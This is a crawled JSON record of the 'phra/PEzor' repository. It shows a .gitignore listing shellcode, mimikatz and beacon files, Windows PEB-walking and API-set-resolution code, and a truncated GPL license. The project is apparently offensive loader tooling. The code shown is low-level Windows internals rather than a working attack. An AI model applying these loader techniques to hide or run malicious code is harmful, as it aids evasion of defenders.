{
  "metadata": {
    "timestamp": 1736710102740,
    "page": 724,
    "hasNextPage": true,
    "endCursor": "Y3Vyc29yOjczMA==",
    "completionStatus": "IN_PROGRESS"
  },
  "repositories": [
    {
      "nameWithOwner": "phra/PEzor",
      "stars": 1873,
      "defaultBranch": "master",
      "files": [
        {
          "name": ".gitignore",
          "type": "blob",
          "size": 0.0673828125,
          "content": "*.exe\n*.o\n*.bin\nshellcode.cpp\nsleep.cpp\ndeps\nPEzor\nmimikatz*\nbeacon.h"
        },
        {
          "name": ".vscode",
          "type": "tree",
          "content": null
        },
        {
          "name": "ApiSetMap.c",
          "type": "blob",
          "size": 8.2578125,
          "content": "/*************************************************************************************\n*  Author: Jeff Tang <jtang@cylance.com>\n*  Copyright (c) 2017 Cylance Inc. All rights reserved.                              *\n*                                                                                    *\n*  Redistribution and use in source and binary forms, with or without modification,  *\n*  are permitted provided that the following conditions are met:                     *\n*                                                                                    *\n*  1. Redistributions of source code must retain the above copyright notice, this    *\n*  list of conditions and the following disclaimer.                                  *\n*                                                                                    *\n*  2. Redistributions in binary form must reproduce the above copyright notice,      *\n*  this list of conditions and the following disclaimer in the documentation and/or  *\n*  other materials provided with the distribution.                                   *\n*                                                                                    *\n*  3. Neither the name of the copyright holder nor the names of its contributors     *\n*  may be used to endorse or promote products derived from this software without     *\n*  specific prior written permission.                                                *\n*                                                                                    *\n*  THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS \"AS IS\" AND   *\n*  ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED     *\n*  WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE            *\n*  DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE FOR  *\n*  ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES    *\n*  (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES;      *\n*  LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON    *\n*  ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT           *\n*  (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS     *\n*  SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.                      *\n*                                                                                    *\n*************************************************************************************/\n\n#include \"ApiSetMap.h\"\n\n__PPEB GetProcessEnvironmentBlock()\n{\n    ULONG_PTR pPeb;\n#ifdef _WIN64\n    pPeb = __readgsqword(0x60);\n#else\n#ifdef WIN_ARM\n    pPeb = *(DWORD *)( (BYTE *)_MoveFromCoprocessor( 15, 0, 13, 0, 2 ) + 0x30 );\n#else\n    // _WIN32\n    pPeb = __readfsdword(0x30);\n#endif\n#endif\n    return (__PPEB)pPeb;\n}\n\n__PLDR_DATA_TABLE_ENTRY GetInMemoryOrderModuleList()\n{\n    return (__PLDR_DATA_TABLE_ENTRY)GetProcessEnvironmentBlock()->pLdr->InMemoryOrderModuleList.Flink;\n}\n\nPWCHAR GetRedirectedName(const PWSTR wszImportingModule, const PWSTR wszVirtualModule, SIZE_T* stSize)\n{\n    PAPI_SET_NAMESPACE_ARRAY_V2 pApiSetMap;\n    pApiSetMap = (PAPI_SET_NAMESPACE_ARRAY_V2)GetProcessEnvironmentBlock()->lpApiSetMap;\n    *stSize = 0;\n\n    if (pApiSetMap->Version == 6)\n        return GetRedirectedName_V6(wszImportingModule, wszVirtualModule, stSize);\n    else if (pApiSetMap->Version == 4)\n        return GetRedirectedName_V4(wszImportingModule, wszVirtualModule, stSize);\n    else if (pApiSetMap->Version == 2)\n        return GetRedirectedName_V2(wszImportingModule, wszVirtualModule, stSize);\n    else\n        return NULL;\n}\n\nPWCHAR GetRedirectedName_V6(const PWSTR wszImportingModule, const PWSTR wszVirtualModule, SIZE_T* stSize)\n{\n    PAPI_SET_NAMESPACE_ARRAY_V6 pApiSetMap;\n    PAPI_SET_NAMESPACE_ENTRY_V6 pApiEntry;\n    PAPI_SET_VALUE_ENTRY_V6 pApiValue;\n    PAPI_SET_VALUE_ENTRY_V6 pApiArray;\n    DWORD dwEntryCount;\n    LONG dwSetCount;\n    PWSTR wsEntry;\n    PWSTR wsName;\n    PWSTR wsValue;\n\n    pApiSetMap = (PAPI_SET_NAMESPACE_ARRAY_V6)GetProcessEnvironmentBlock()->lpApiSetMap;\n\n    // Loop through each entry in the ApiSetMap to find the matching redirected module entry\n    for (dwEntryCount = 0; dwEntryCount < pApiSetMap->Count; dwEntryCount++)\n    {\n        pApiEntry = &pApiSetMap->Array[dwEntryCount];\n        wsEntry = (PWSTR)((PCHAR)pApiSetMap + pApiEntry->NameOffset);\n\n        // Skip this entry if it does not match\n        if (_wcsnicmp(wsEntry, wszVirtualModule, pApiEntry->NameLength / 2) != 0)\n            continue;\n\n        pApiArray = (PAPI_SET_VALUE_ENTRY_V6)((PCHAR)pApiSetMap + pApiEntry->DataOffset);\n\n        // Loop through each value entry from the end and find where the importing module matches the ``Name`` entry\n        // If the ``Name`` entry is empty, it is the default entry @ index = 0\n        for (dwSetCount = pApiEntry->Count-1; dwSetCount >= 0; dwSetCount--)\n        {\n           // pApiValue = (PAPI_SET_VALUE_ENTRY_V6)((PCHAR)pApiSetMap + pApiEntry->DataOffset + (dwSetCount * sizeof(API_SET_VALUE_ENTRY_V6)));\n            pApiValue = &pApiArray[dwSetCount];\n            wsName = (PWSTR)((PCHAR)pApiSetMap + pApiValue->NameOffset);\n            wsValue = (PWSTR)((PCHAR)pApiSetMap + pApiValue->ValueOffset);\n\n            if (pApiValue->NameLength == 0 || _wcsnicmp(wsName, wszImportingModule, pApiValue->NameLength / 2) == 0)\n            {\n                *stSize = pApiValue->ValueLength / 2;\n                return wsValue;\n            }\n        }\n    }\n    return NULL;\n}\n\n\nPWCHAR GetRedirectedName_V4(const PWSTR wszImportingModule, const PWSTR wszVirtualModule, SIZE_T* stSize)\n{\n    PAPI_SET_NAMESPACE_ARRAY_V4 pApiSetMap;\n    PAPI_SET_NAMESPACE_ENTRY_V4 pApiEntry;\n    PAPI_SET_VALUE_ARRAY_V4 pApiArray;\n    PAPI_SET_VALUE_ENTRY_V4 pApiValue;\n    DWORD dwEntryCount;\n    LONG dwSetCount;\n    PWSTR wsEntry;\n    PWSTR wsName;\n    PWSTR wsValue;\n\n\n    pApiSetMap = (PAPI_SET_NAMESPACE_ARRAY_V4)GetProcessEnvironmentBlock()->lpApiSetMap;\n    for (dwEntryCount = 0; dwEntryCount < pApiSetMap->Count; dwEntryCount++)\n    {\n        pApiEntry = &pApiSetMap->Array[dwEntryCount];\n        wsEntry = (PWSTR)((PCHAR)pApiSetMap + pApiEntry->NameOffset);\n\n        if (_wcsnicmp(wsEntry, wszVirtualModule, pApiEntry->NameLength / 2) != 0)\n            continue;\n\n        pApiArray = (PAPI_SET_VALUE_ARRAY_V4)((PCHAR)pApiSetMap + pApiEntry->DataOffset);\n\n        for (dwSetCount = pApiArray->Count-1; dwSetCount >= 0; dwSetCount--)\n        {\n            pApiValue = &pApiArray->Array[dwSetCount];\n            wsName = (PWSTR)((PCHAR)pApiSetMap + pApiValue->NameOffset);\n            wsValue = (PWSTR)((PCHAR)pApiSetMap + pApiValue->ValueOffset);\n\n            if (pApiValue->NameLength == 0 || _wcsnicmp(wsName, wszImportingModule, pApiValue->NameLength / 2) == 0)\n            {\n                *stSize = pApiValue->ValueLength / 2;\n                return wsValue;\n            }\n        }\n    }\n    return NULL;\n}\n\nPWCHAR GetRedirectedName_V2(const PWSTR wszImportingModule, const PWSTR wszVirtualModule, SIZE_T* stSize)\n{\n    PAPI_SET_NAMESPACE_ARRAY_V2 pApiSetMap;\n    PAPI_SET_NAMESPACE_ENTRY_V2 pApiEntry;\n    PAPI_SET_VALUE_ARRAY_V2 pApiArray;\n    PAPI_SET_VALUE_ENTRY_V2 pApiValue;\n    DWORD dwEntryCount;\n    LONG dwSetCount;\n    PWSTR wsEntry;\n    PWSTR wsName;\n    PWSTR wsValue;\n\n\n    pApiSetMap = (PAPI_SET_NAMESPACE_ARRAY_V2)GetProcessEnvironmentBlock()->lpApiSetMap;\n\n    for (dwEntryCount = 0; dwEntryCount < pApiSetMap->Count; dwEntryCount++)\n    {\n        pApiEntry = &pApiSetMap->Array[dwEntryCount];\n        wsEntry = (PWSTR)((PCHAR)pApiSetMap + pApiEntry->NameOffset);\n\n        if (_wcsnicmp(wsEntry, wszVirtualModule, pApiEntry->NameLength / 2) != 0)\n            continue;\n\n        pApiArray = (PAPI_SET_VALUE_ARRAY_V2)((PCHAR)pApiSetMap + pApiEntry->DataOffset);\n\n        for (dwSetCount = pApiArray->Count-1; dwSetCount >= 0; dwSetCount--)\n        {\n            pApiValue = &pApiArray->Array[dwSetCount];\n            wsName = (PWSTR)((PCHAR)pApiSetMap + pApiValue->NameOffset);\n            wsValue = (PWSTR)((PCHAR)pApiSetMap + pApiValue->ValueOffset);\n\n            if (pApiValue->NameLength == 0 || _wcsnicmp(wsName, wszImportingModule, pApiValue->NameLength / 2) == 0)\n            {\n                *stSize = pApiValue->ValueLength / 2;\n                return wsValue;\n            }\n        }\n    }\n    return NULL;\n}\n"
        },
        {
          "name": "ApiSetMap.h",
          "type": "blob",
          "size": 9.201171875,
          "content": "/*************************************************************************************\n*  Author: Jeff Tang <jtang@cylance.com>\n*  Copyright (c) 2017 Cylance Inc. All rights reserved.                              *\n*                                                                                    *\n*  Redistribution and use in source and binary forms, with or without modification,  *\n*  are permitted provided that the following conditions are met:                     *\n*                                                                                    *\n*  1. Redistributions of source code must retain the above copyright notice, this    *\n*  list of conditions and the following disclaimer.                                  *\n*                                                                                    *\n*  2. Redistributions in binary form must reproduce the above copyright notice,      *\n*  this list of conditions and the following disclaimer in the documentation and/or  *\n*  other materials provided with the distribution.                                   *\n*                                                                                    *\n*  3. Neither the name of the copyright holder nor the names of its contributors     *\n*  may be used to endorse or promote products derived from this software without     *\n*  specific prior written permission.                                                *\n*                                                                                    *\n*  THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS \"AS IS\" AND   *\n*  ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED     *\n*  WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE            *\n*  DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE FOR  *\n*  ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES    *\n*  (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES;      *\n*  LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON    *\n*  ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT           *\n*  (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS     *\n*  SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.                      *\n*                                                                                    *\n*************************************************************************************/\n\n#pragma once\n#ifndef _APISETMAP_H_\n#define _APISETMAP_H_\n\n#define WIN32_LEAN_AND_MEAN\n#include <windows.h>\n#include <subauth.h>\n//#include <winternl.h>\n\ntypedef struct __LDR_DATA_TABLE_ENTRY\n{\n    //LIST_ENTRY InLoadOrderLinks; // As we search from PPEB_LDR_DATA->InMemoryOrderModuleList we dont use the first entry.\n    LIST_ENTRY InMemoryOrderModuleList;\n    LIST_ENTRY InInitializationOrderModuleList;\n    PVOID DllBase;\n    PVOID EntryPoint;\n    ULONG SizeOfImage;\n    UNICODE_STRING FullDllName;\n    UNICODE_STRING BaseDllName;\n    ULONG Flags;\n    SHORT LoadCount;\n    SHORT TlsIndex;\n    LIST_ENTRY HashTableEntry;\n    ULONG TimeDateStamp;\n} __LDR_DATA_TABLE_ENTRY, *__PLDR_DATA_TABLE_ENTRY;\n\n// WinDbg> dt -v ntdll!_PEB_LDR_DATA\ntypedef struct __PEB_LDR_DATA //, 7 elements, 0x28 bytes\n{\n    DWORD dwLength;\n    DWORD dwInitialized;\n    LPVOID lpSsHandle;\n    LIST_ENTRY InLoadOrderModuleList;\n    LIST_ENTRY InMemoryOrderModuleList;\n    LIST_ENTRY InInitializationOrderModuleList;\n    LPVOID lpEntryInProgress;\n} __PEB_LDR_DATA, * __PPEB_LDR_DATA;\n\n// WinDbg> dt -v ntdll!_PEB_FREE_BLOCK\ntypedef struct _PEB_FREE_BLOCK // 2 elements, 0x8 bytes\n{\n    struct _PEB_FREE_BLOCK * pNext;\n    DWORD dwSize;\n} PEB_FREE_BLOCK, * PPEB_FREE_BLOCK;\n\n// struct _PEB is defined in Winternl.h but it is incomplete\n// WinDbg> dt -v ntdll!_PEB\ntypedef struct __PEB // 65 elements, 0x210 bytes\n{\n    BYTE bInheritedAddressSpace;\n    BYTE bReadImageFileExecOptions;\n    BYTE bBeingDebugged;\n    BYTE bSpareBool;\n    LPVOID lpMutant;\n    LPVOID lpImageBaseAddress;\n    __PPEB_LDR_DATA pLdr;\n    LPVOID lpProcessParameters;\n    LPVOID lpSubSystemData;\n    LPVOID lpProcessHeap;\n    PRTL_CRITICAL_SECTION pFastPebLock;\n    LPVOID lpFastPebLockRoutine;\n    LPVOID lpFastPebUnlockRoutine;\n    DWORD dwEnvironmentUpdateCount;\n    LPVOID lpKernelCallbackTable;\n    DWORD dwSystemReserved;\n    DWORD dwAtlThunkSListPtr32;\n    LPVOID lpApiSetMap;\t\t\t\t// used to be PPEB_FREE_BLOCK pFreeList;\n    DWORD dwTlsExpansionCounter;\n    LPVOID lpTlsBitmap;\n    DWORD dwTlsBitmapBits[2];\n    LPVOID lpReadOnlySharedMemoryBase;\n    LPVOID lpReadOnlySharedMemoryHeap;\n    LPVOID lpReadOnlyStaticServerData;\n    LPVOID lpAnsiCodePageData;\n    LPVOID lpOemCodePageData;\n    LPVOID lpUnicodeCaseTableData;\n    DWORD dwNumberOfProcessors;\n    DWORD dwNtGlobalFlag;\n    LARGE_INTEGER liCriticalSectionTimeout;\n    DWORD dwHeapSegmentReserve;\n    DWORD dwHeapSegmentCommit;\n    DWORD dwHeapDeCommitTotalFreeThreshold;\n    DWORD dwHeapDeCommitFreeBlockThreshold;\n    DWORD dwNumberOfHeaps;\n    DWORD dwMaximumNumberOfHeaps;\n    LPVOID lpProcessHeaps;\n    LPVOID lpGdiSharedHandleTable;\n    LPVOID lpProcessStarterHelper;\n    DWORD dwGdiDCAttributeList;\n    LPVOID lpLoaderLock;\n    DWORD dwOSMajorVersion;\n    DWORD dwOSMinorVersion;\n    WORD wOSBuildNumber;\n    WORD wOSCSDVersion;\n    DWORD dwOSPlatformId;\n    DWORD dwImageSubsystem;\n    DWORD dwImageSubsystemMajorVersion;\n    DWORD dwImageSubsystemMinorVersion;\n    DWORD dwImageProcessAffinityMask;\n    DWORD dwGdiHandleBuffer[34];\n    LPVOID lpPostProcessInitRoutine;\n    LPVOID lpTlsExpansionBitmap;\n    DWORD dwTlsExpansionBitmapBits[32];\n    DWORD dwSessionId;\n    ULARGE_INTEGER liAppCompatFlags;\n    ULARGE_INTEGER liAppCompatFlagsUser;\n    LPVOID lppShimData;\n    LPVOID lpAppCompatInfo;\n    UNICODE_STRING usCSDVersion;\n    LPVOID lpActivationContextData;\n    LPVOID lpProcessAssemblyStorageMap;\n    LPVOID lpSystemDefaultActivationContextData;\n    LPVOID lpSystemAssemblyStorageMap;\n    DWORD dwMinimumStackCommit;\n} __PEB, * __PPEB;\n\ntypedef struct\n{\n    WORD\toffset:12;\n    WORD\ttype:4;\n} IMAGE_RELOC, *PIMAGE_RELOC;\n\n#define DEREF( name )*(UINT_PTR *)(name)\n#define DEREF_64( name )*(DWORD64 *)(name)\n#define DEREF_32( name )*(DWORD *)(name)\n#define DEREF_16( name )*(WORD *)(name)\n#define DEREF_8( name )*(BYTE *)(name)\n\n__PPEB GetProcessEnvironmentBlock();\n__PLDR_DATA_TABLE_ENTRY GetInMemoryOrderModuleList();\n\n// Win 10\ntypedef struct _API_SET_VALUE_ENTRY_V6\n{\n    ULONG Flags;\n    ULONG NameOffset;\n    ULONG NameLength;\n    ULONG ValueOffset;\n    ULONG ValueLength;\n} API_SET_VALUE_ENTRY_V6, *PAPI_SET_VALUE_ENTRY_V6;\n\ntypedef struct _API_SET_NAMESPACE_HASH_ENTRY_V6\n{\n    ULONG Hash;\n    ULONG Index;\n} API_SET_NAMESPACE_HASH_ENTRY_V6, *PAPI_SET_NAMESPACE_HASH_ENTRY_V6;\n\ntypedef struct _API_SET_NAMESPACE_ENTRY_V6\n{\n    ULONG Flags;\n    ULONG NameOffset;\n    ULONG Size;\n    ULONG NameLength;\n    ULONG DataOffset;\n    ULONG Count;\n} API_SET_NAMESPACE_ENTRY_V6, *PAPI_SET_NAMESPACE_ENTRY_V6;\n\ntypedef struct _API_SET_NAMESPACE_ARRAY_V6\n{\n    ULONG Version;\n    ULONG Size;\n    ULONG Flags;\n    ULONG Count;\n    ULONG DataOffset;\n    ULONG HashOffset;\n    ULONG Multiplier;\n    API_SET_NAMESPACE_ENTRY_V6 Array[ANYSIZE_ARRAY];\n} API_SET_NAMESPACE_ARRAY_V6, *PAPI_SET_NAMESPACE_ARRAY_V6;\n\n// Windows 8.1\ntypedef struct _API_SET_VALUE_ENTRY_V4\n{\n    ULONG Flags;\n    ULONG NameOffset;\n    ULONG NameLength;\n    ULONG ValueOffset;\n    ULONG ValueLength;\n} API_SET_VALUE_ENTRY_V4, *PAPI_SET_VALUE_ENTRY_V4;\n\ntypedef struct _API_SET_VALUE_ARRAY_V4\n{\n    ULONG Flags;\n    ULONG Count;\n    API_SET_VALUE_ENTRY_V4 Array[ANYSIZE_ARRAY];\n} API_SET_VALUE_ARRAY_V4, *PAPI_SET_VALUE_ARRAY_V4;\n\ntypedef struct _API_SET_NAMESPACE_ENTRY_V4\n{\n    ULONG Flags;\n    ULONG NameOffset;\n    ULONG NameLength;\n    ULONG AliasOffset;\n    ULONG AliasLength;\n    ULONG DataOffset;\n} API_SET_NAMESPACE_ENTRY_V4, *PAPI_SET_NAMESPACE_ENTRY_V4;\n\ntypedef struct _API_SET_NAMESPACE_ARRAY_V4\n{\n    ULONG Version;\n    ULONG Size;\n    ULONG Flags;\n    ULONG Count;\n    API_SET_NAMESPACE_ENTRY_V4 Array[ANYSIZE_ARRAY];\n} API_SET_NAMESPACE_ARRAY_V4, *PAPI_SET_NAMESPACE_ARRAY_V4;\n\n// Windows 7/8\ntypedef struct _API_SET_VALUE_ENTRY_V2\n{\n    ULONG NameOffset;\n    ULONG NameLength;\n    ULONG ValueOffset;\n    ULONG ValueLength;\n} API_SET_VALUE_ENTRY_V2, *PAPI_SET_VALUE_ENTRY_V2;\n\ntypedef struct _API_SET_VALUE_ARRAY_V2\n{\n    ULONG Count;\n    API_SET_VALUE_ENTRY_V2 Array[ANYSIZE_ARRAY];\n} API_SET_VALUE_ARRAY_V2, *PAPI_SET_VALUE_ARRAY_V2;\n\ntypedef struct _API_SET_NAMESPACE_ENTRY_V2\n{\n    ULONG NameOffset;\n    ULONG NameLength;\n    ULONG DataOffset;\n} API_SET_NAMESPACE_ENTRY_V2, *PAPI_SET_NAMESPACE_ENTRY_V2;\n\ntypedef struct _API_SET_NAMESPACE_ARRAY_V2\n{\n    ULONG Version;\n    ULONG Count;\n    API_SET_NAMESPACE_ENTRY_V2 Array[ANYSIZE_ARRAY];\n} API_SET_NAMESPACE_ARRAY_V2, *PAPI_SET_NAMESPACE_ARRAY_V2;\n\nPWCHAR GetRedirectedName(const PWSTR wszImportingModule, const PWSTR wszVirtualModule, SIZE_T* stSize);\nPWCHAR GetRedirectedName_V6(const PWSTR wszImportingModule, const PWSTR wszVirtualModule, SIZE_T* stSize);\nPWCHAR GetRedirectedName_V4(const PWSTR wszImportingModule, const PWSTR wszVirtualModule, SIZE_T* stSize);\nPWCHAR GetRedirectedName_V2(const PWSTR wszImportingModule, const PWSTR wszVirtualModule, SIZE_T* stSize);\n\n#endif // _APISETMAP_H_\n"
        },
        {
          "name": "LICENSE",
          "type": "blob",
          "size": 34.3173828125,
          "content": "                    GNU GENERAL PUBLIC LICENSE\n                       Version 3, 29 June 2007\n\n Copyright (C) 2007 Free Software Foundation, Inc. <http://fsf.org/>\n Everyone is permitted to copy and distribute verbatim copies\n of this license document, but changing it is not allowed.\n\n                            Preamble\n\n  The GNU General Public License is a free, copyleft license for\nsoftware and other kinds of works.\n\n  The licenses for most software and other practical works are designed\nto take away your freedom to share and change the works.  By contrast,\nthe GNU General Public License is intended to guarantee your freedom to\nshare and change all versions of a program--to make sure it remains free\nsoftware for all its users.  We, the Free Software Foundation, use the\nGNU General Public License for most of our software; it applies also to\nany other work released this way by its authors.  You can apply it to\nyour programs, too.\n\n  When we speak of free software, we are referring to freedom, not\nprice.  Our General Public Licenses are designed to make sure that you\nhave the freedom to distribute copies of free software (and charge for\nthem if you wish), that you receive source code or can get it if you\nwant it, that you can change the software or use pieces of it in new\nfree programs, and that you know you can do these things.\n\n  To protect your rights, we need to prevent others from denying you\nthese rights or asking you to surrender the rights.  Therefore, you have\ncertain responsibilities if you distribute copies of the software, or if\nyou modify it: responsibilities to respect the freedom of others.\n\n  For example, if you distribute copies of such a program, whether\ngratis or for a fee, you must pass on to the recipients the same\nfreedoms that you received.  You must make sure that they, too, receive\nor can get the source code.  And you must show them these terms so they\nknow their rights.\n\n  Developers that use the GNU GPL protect your rights with two steps:\n(1) assert copyright on the software, and (2) offer you this License\ngiving you legal permission to copy, distribute and/or modify it.\n\n  For the developers' and authors' protection, the GPL clearly explains\nthat there is no warranty for this free software.  For both users' and\nauthors' sake, the GPL requires that modified versions be marked as\nchanged, so that their problems will not be attributed erroneously to\nauthors of previous versions.\n\n  Some devices are designed to deny users access to install or run\nmodified versions of the software inside them, although the manufacturer\ncan do so.  This is fundamentally incompatible with the aim of\nprotecting users' freedom to change the software.  The systematic\npattern of such abuse occurs in the area of products for individuals to\nuse, which is precisely where it is most unacceptable.  Therefore, we\nhave designed this version of the GPL to prohibit the practice for those\nproducts.  If such problems arise substantially in other domains, we\nstand ready to extend this provision to those domains in future versions\nof the GPL, as needed to protect the freedom of users.\n\n  Finally, every program is threatened constantly by software patents.\nStates should not allow patents to restrict development and use of\nsoftware on general-purpose computers, but in those that do, we wish to\navoid the special danger that patents applied to a free program could\nmake it effectively proprietary.  To prevent this, the GPL assures that\npatents cannot be used to render the program non-free.\n\n  The precise terms and conditions for copying, distribution and\nmodification follow.\n\n                       TERMS AND CONDITIONS\n\n  0. Definitions.\n\n  \"This License\" refers to version 3 of the GNU General Public License.\n\n  \"Copyright\" also means copyright-like laws that apply to other kinds of\nworks, such as semiconductor masks.\n\n  \"The Program\" refers to any copyrightable work licensed under this\nLicense.  Each licensee is addressed as \"you\".  \"Licensees\" and\n\"recipients\" may be individuals or organizations.\n\n  To \"modify\" a work means to copy from or adapt all or part of the work\nin a fashion requiring copyright permission, other than the making of an\nexact copy.  The resulting work is called a \"modified version\" of the\nearlier work or a work \"based on\" the earlier work.\n\n  A \"covered work\" means either the unmodified Program or a work based\non the Program.\n\n  To \"propagate\" a work means to do anything with it that, without\npermission, would make you directly or secondarily liable for\ninfringement under applicable copyright law, except executing it on a\ncomputer or modifying a private copy.  Propagation includes copying,\ndistribution (with or without modification), making available to the\npublic, and in some countries other activities as well.\n\n  To \"convey\" a work means any kind of propagation that enables other\nparties to make or receive copies.  Mere interaction with a user through\na computer network, with no transfer of a copy, is not conveying.\n\n  An interactive user interface displays \"Appropriate Legal Notices\"\nto the extent that it includes a convenient and prominently visible\nfeature that (1) displays an appropriate copyright notice, and (2)\ntells the user that there is no warranty for the work (except to the\nextent that warranties are provided), that licensees may convey the\nwork under this License, and how to view a copy of this License.  If\nthe interface presents a list of user commands or options, such as a\nmenu, a prominent item in the list meets this criterion.\n\n  1. Source Code.\n\n  The \"source code\" for a work means the preferred form of the work\nfor making modifications to it.  \"Object code\" means any non-source\nform of a work.\n\n  A \"Standard Interface\" means an interface that either is an official\nstandard defined by a recognized standards body, or, in the case of\ninterfaces specified for a particular programming language, one that\nis widely used among developers working in that language.\n\n  The \"System Libraries\" of an executable work include anything, other\nthan the work as a whole, that (a) is included in the normal form of\npackaging a Major Component, but which is not part of that Major\nComponent, and (b) serves only to enable use of the work with that\nMajor Component, or to implement a Standard Interface for which an\nimplementation is available to the public in source code form.  A\n\"Major Component\", in this context, means a major essential component\n(kernel, window system, and so on) of the specific operating system\n(if any) on which the executable work runs, or a compiler used to\nproduce the work, or an object code interpreter used to run it.\n\n  The \"Corresponding Source\" for a work in object code form means all\nthe source code needed to generate, install, and (for an executable\nwork) run the object code and to modify the work, including scripts to\ncontrol those activities.  However, it does not include the work's\nSystem Libraries, or general-purpose tools or generally available free\nprograms which are used unmodified in performing those activities but\nwhich are not part of the work.  For example, Corresponding Source\nincludes interface definition files associated with source files for\nthe work, and the source code for shared libraries and dynamically\nlinked subprograms that the work is specifically designed to require,\nsuch as by intimate data communication or control flow between those\nsubprograms and other parts of the work.\n\n  The Corresponding Source need not include anything that users\ncan regenerate automatically from other parts of the Corresponding\nSource.\n\n  The Corresponding Source for a work in source code form is that\nsame work.\n\n  2. Basic Permissions.\n\n  All rights granted under this License are granted for the term of\ncopyright on the Program, and are irrevocable provided the stated\nconditions are met.  This License explicitly affirms your unlimited\npermission to run the unmodified Program.  The output from running a\ncovered work is covered by this License only if the output, given its\ncontent, constitutes a covered work.  This License acknowledges your\nrights of fair use or other equivalent, as provided by copyright law.\n\n  You may make, run and propagate covered works that you do not\nconvey, without conditions so long as your license otherwise remains\nin force.  You may convey covered works to others for the sole purpose\nof having them make modifications exclusively for you, or provide you\nwith facilities for running those works, provided that you comply with\nthe terms of this License in conveying all material for which you do\nnot control copyright.  Those thus making or running the covered works\nfor you must do so exclusively on your behalf, under your direction\nand control, on terms that prohibit them from making any copies of\nyour copyrighted material outside their relationship with you.\n\n  Conveying under any other circumstances is permitted solely under\nthe conditions stated below.  Sublicensing is not allowed; section 10\nmakes it unnecessary.\n\n  3. Protecting Users' Legal Rights From Anti-Circumvention Law.\n\n  No covered work shall be deemed part of an effective technological\nmeasure under any applicable law fulfilling obligations under article\n11 of the WIPO copyright treaty adopted on 20 December 1996, or\nsimilar laws prohibiting or restricting circumvention of such\nmeasures.\n\n  When you convey a covered work, you waive any legal power to forbid\ncircumvention of technological measures to the extent such circumvention\nis effected by exercising rights under this License with respect to\nthe covered work, and you disclaim any intention to limit operation or\nmodification of the work as a means of enforcing, against the work's\nusers, your or third parties' legal rights to forbid circumvention of\ntechnological measures.\n\n  4. Conveying Verbatim Copies.\n\n  You may convey verbatim copies of the Program's source code as you\nreceive it, in any medium, provided that you conspicuously and\nappropriately publish on each copy an appropriate copyright notice;\nkeep intact all notices stating that this License and any\nnon-permissive terms added in accord with section 7 apply to the code;\nkeep intact all notices of the absence of any warranty; and give all\nrecipients a copy of this License along with the Program.\n\n  You may charge any price or no price for each copy that you convey,\nand you may offer support or warranty protection for a fee.\n\n  5. Conveying Modified Source Versions.\n\n  You may convey a work based on the Program, or the modifications to\nproduce it from the Program, in the form of source code under the\nterms of section 4, provided that you also meet all of these conditions:\n\n    a) The work must carry prominent notices stating that you modified\n    it, and giving a relevant date.\n\n    b) The work must carry prominent notices stating that it is\n    released under this License and any conditions added under section\n    7.  This requirement modifies the requirement in section 4 to\n    \"keep intact all notices\".\n\n    c) You must license the entire work, as a whole, under this\n    License to anyone who comes into possession of a copy.  This\n    License will therefore apply, along with any applicable section 7\n    additional terms, to the whole of the work, and all its parts,\n    regardless of how they are packaged.  This License gives no\n    permission to license the work in any other way, but it does not\n    invalidate such permission if you have separately received it.\n\n    d) If the work has interactive user interfaces, each must display\n    Appropriate Legal Notices; however, if the Program has interactive\n    interfaces that do not display Appropriate Legal Notices, your\n    work need not make them do so.\n\n  A compilation of a covered work with other separate and independent\nworks, which are not by their nature extensions of the covered work,\nand which are not combined with it such as to form a larger program,\nin or on a volume of a storage or distribution medium, is called an\n\"aggregate\" if the compilation and its resulting copyright are not\nused to limit the access or legal rights of the compilation's users\nbeyond what the individual works permit.  Inclusion of a covered work\nin an aggregate does not cause this License to apply to the other\nparts of the aggregate.\n\n  6. Conveying Non-Source Forms.\n\n  You may convey a covered work in object code form under the terms\nof sections 4 and 5, provided that you also convey the\nmachine-readable Corresponding Source under the terms of this License,\nin one of these ways:\n\n    a) Convey the object code in, or embodied in, a physical product\n    (including a physical distribution medium), accompanied by the\n    Corresponding Source fixed on a durable physical medium\n    customarily used for software interchange.\n\n    b) Convey the object code in, or embodied in, a physical product\n    (including a physical distribution medium), accompanied by a\n    written offer, valid for at least three years and valid for as\n    long as you offer spare parts or customer support for that product\n    model, to give anyone who possesses the object code either (1) a\n    copy of the Corresponding Source for all the software in the\n    product that is covered by this License, on a durable physical\n    medium customarily used for software interchange, for a price no\n    more than your reasonable cost of physically performing this\n    conveying of source, or (2) access to copy the\n    Corresponding Source from a network server at no charge.\n\n    c) Convey individual copies of the object code with a copy of the\n    written offer to provide the Corresponding Source.  This\n    alternative is allowed only occasionally and noncommercially, and\n    only if you received the object code with such an offer, in accord\n    with subsection 6b.\n\n    d) Convey the object code by offering access from a designated\n    place (gratis or for a charge), and offer 